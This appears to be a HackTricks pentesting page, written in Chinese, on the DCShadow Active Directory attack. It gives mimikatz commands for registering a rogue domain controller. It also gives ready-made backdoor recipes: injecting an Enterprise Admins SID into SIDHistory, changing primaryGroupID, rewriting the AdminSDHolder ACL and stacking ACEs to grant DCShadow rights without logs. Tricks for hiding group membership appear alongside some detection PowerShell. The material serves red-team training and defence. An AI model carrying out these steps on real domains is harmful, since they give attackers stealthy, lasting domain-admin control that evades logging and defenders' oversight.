# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

它会在 AD 中注册一个**新的 Domain Controller**，并使用它向指定对象**推送属性**（SIDHistory、SPNs……），且不会留下任何关于这些**修改**的**logs**。你**需要 DA** 权限，并且必须位于**根域**中。\
注意，如果使用了错误的数据，就会出现非常难看的 logs。<sup>[[2]](#references)</sup>

要执行此攻击，你需要 2 个 mimikatz 实例。其中一个实例将以 SYSTEM 权限启动 RPC servers（你必须在此处指明要执行的更改），另一个实例将用于推送这些值：
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
注意，**`elevate::token`** 在 `mimikatz1` session 中不会生效，因为它提升的是 thread 的权限，而我们需要提升 **process 的权限**。\
你也可以选择 "LDAP" object：`/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

你可以通过 DA 或具有以下最小权限的 user push 这些更改：

- 在 **domain object** 中：
- _DS-Install-Replica_（在 Domain 中添加/删除 Replica）
- _DS-Replication-Manage-Topology_（管理 Replication Topology）
- _DS-Replication-Synchronize_（Replication Synchronization）
- **Configuration container** 中的 **Sites object**（及其子对象）：
- _CreateChild 和 DeleteChild_
- 注册为 DC 的 **computer object**：
- _WriteProperty_（不是 Write）
- **target object**：
- _WriteProperty_（不是 Write）

你可以使用 [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) 将这些权限授予 unprivileged user（注意，这会留下一些 logs）。这比拥有 DA 权限的限制性强得多。\
例如：`Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 这表示，当 username _**student1**_ 登录 **mcorp-student1** machine 时，对 object _**root1user**_ 拥有 DCShadow 权限。

## 使用 DCShadow 创建 backdoors
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group 滥用、枚举盲点与检测

- `primaryGroupID` 是独立于组 `member` 列表的另一个属性。DCShadow/DSInternals 可以直接写入该属性（例如将 **Domain Admins** 的 `primaryGroupID` 设置为 `512`），无需经过本机 LSASS 强制校验；但 AD 仍会**移动**该用户：更改 PGID 始终会将用户从之前的 primary group 中移除（对任何目标组均如此），因此无法保留原有的 primary-group membership。<sup>[[1]](#references)</sup>
- 默认工具不允许将用户从其当前 primary group 中移除（`ADUC`、`Remove-ADGroupMember`），因此更改 PGID 通常需要直接写入 directory（DCShadow/`Set-ADDBPrimaryGroup`）。
- Membership reporting 的结果并不一致：
- **包含**由 primary group 派生的成员：`Get-ADGroupMember "Domain Admins"`、`net group "Domain Admins"`、ADUC/Admin Center。
- **省略**由 primary group 派生的成员：`Get-ADGroup "Domain Admins" -Properties member`、使用 ADSI Edit 检查 `member`、`Get-ADUser <user> -Properties memberOf`。
- 如果 **primary group 本身是嵌套组**，递归检查可能会遗漏 primary-group members（例如用户的 PGID 指向 Domain Admins 内部的嵌套组）；`Get-ADGroupMember -Recursive` 或 LDAP recursive filters 不会返回该用户，除非递归逻辑显式解析 primary groups。
- DACL tricks：攻击者可以在用户对象上对 `primaryGroupID` 设置 **deny ReadProperty**（或者针对非 AdminSDHolder groups，在组的 `member` 属性上设置该拒绝），从而对大多数 PowerShell queries 隐藏 effective membership；`net group` 仍会解析该 membership。受 AdminSDHolder 保护的 groups 会重置此类拒绝。

Detection/monitoring 示例：
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
通过将 `Get-ADGroupMember` 输出与 `Get-ADGroup -Properties member` 或 ADSI Edit 进行比较，交叉检查特权组，以发现由 `primaryGroupID` 或隐藏属性引入的差异。<sup>[[1]](#references)</sup>

## Shadowception - 使用 DCShadow 授予 DCShadow 权限（无修改权限日志）

我们需要在末尾追加以下 ACE，并使用我们用户的 SID：<sup>[[2]](#references)</sup>

- 在域对象上：
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 在攻击者计算机对象上：`(A;;WP;;;UserSID)`
- 在目标用户对象上：`(A;;WP;;;UserSID)`
- 在 Configuration 容器中的 Sites 对象上：`(A;CI;CCDC;;;UserSID)`

获取对象当前 ACE：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

在此情况下，你需要进行**多项更改**，而不只是一次更改。在 **mimikatz1 session**（RPC server）中，对每次更改都使用 **`/stack` 参数**。然后只需执行一次 **`/push`**，即可应用 rogue server 中堆叠的所有更改。

[**有关 DCShadow 的更多信息，请参阅 ired.team。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group 行为、报告与利用实战](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team 上的 DCShadow 分析文章](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
